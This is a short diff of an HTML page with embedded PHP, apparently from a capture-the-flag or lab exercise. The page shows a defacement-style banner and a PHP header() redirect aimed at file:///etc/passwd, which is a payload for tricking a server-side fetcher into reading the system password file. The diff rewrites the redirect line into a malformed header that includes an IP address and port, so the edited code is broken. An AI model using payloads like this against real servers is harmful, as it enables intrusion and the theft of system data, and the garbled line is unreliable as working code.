@@ -8,7 +8,7 @@
 <body>
     <h1>PR4153 WAS H3R3!!</h1>
     <?php
-    header('location: file:///etc/passwd');
+    header('83.136.254.243:57772: file:///etc/passwd');
     ?>
 </body>
 </html>
